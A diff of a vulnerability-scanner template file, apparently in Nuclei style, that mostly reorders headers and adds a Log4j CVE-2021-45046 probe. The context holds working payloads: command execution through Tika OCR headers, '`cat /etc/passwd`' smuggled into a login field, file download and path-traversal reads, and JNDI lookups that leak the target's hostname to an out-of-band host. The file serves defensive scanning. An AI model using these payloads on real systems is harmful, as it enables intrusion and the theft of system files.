@@ -5869,11 +5869,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -9662,8 +9662,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -10001,9 +10001,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -12323,7 +12323,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/s/123cfx/_/;/WEB-INF/web.xml"
+            "{{BaseURL}}/s/{{randstr}}/_/;/WEB-INF/web.xml"
           ]
         }
       ]
@@ -14340,6 +14340,20 @@
         {
           "raw": [
             "GET /language/lang HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\nCookie: s_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype=\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-45046",
+      "info": {
+        "name": "Remote code injection in Log4j",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /?x=${jndi:ldap://127.0.0.1#.${hostName}.{{interactsh-url}}/a} HTTP/1.1\nHost: {{Hostname}}\nAccept: ${jndi:ldap://127.0.0.1#.${hostName}.accept.{{interactsh-url}}}\nAccept-Encoding: ${jndi:ldap://127.0.0.1#.${hostName}.acceptencoding.{{interactsh-url}}}\nAccept-Language: ${jndi:ldap://127.0.0.1#.${hostName}.acceptlanguage.{{interactsh-url}}}\nAccess-Control-Request-Headers: ${jndi:ldap://127.0.0.1#.${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}\nAccess-Control-Request-Method: ${jndi:ldap://127.0.0.1#.${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}\nAuthentication: Basic ${jndi:ldap://127.0.0.1#.${hostName}.authenticationbasic.{{interactsh-url}}}\nAuthentication: Bearer ${jndi:ldap://127.0.0.1#.${hostName}.authenticationbearer.{{interactsh-url}}}\nCookie: ${jndi:ldap://127.0.0.1#.${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}\nLocation: ${jndi:ldap://127.0.0.1#.${hostName}.location.{{interactsh-url}}}\nOrigin: ${jndi:ldap://127.0.0.1#.${hostName}.origin.{{interactsh-url}}}\nReferer: ${jndi:ldap://127.0.0.1#.${hostName}.referer.{{interactsh-url}}}\nUpgrade-Insecure-Requests: ${jndi:ldap://127.0.0.1#.${hostName}.upgradeinsecurerequests.{{interactsh-url}}}\nUser-Agent: ${jndi:ldap://127.0.0.1#.${hostName}.useragent.{{interactsh-url}}}\nX-Api-Version: ${jndi:ldap://127.0.0.1#.${hostName}.xapiversion.{{interactsh-url}}}\nX-CSRF-Token: ${jndi:ldap://127.0.0.1#.${hostName}.xcsrftoken.{{interactsh-url}}}\nX-Druid-Comment: ${jndi:ldap://127.0.0.1#.${hostName}.xdruidcomment.{{interactsh-url}}}\nX-Forwarded-For: ${jndi:ldap://127.0.0.1#.${hostName}.xforwardedfor.{{interactsh-url}}}\nX-Origin: ${jndi:ldap://127.0.0.1#.${hostName}.xorigin.{{interactsh-url}}}\n"
           ]
         }
       ]
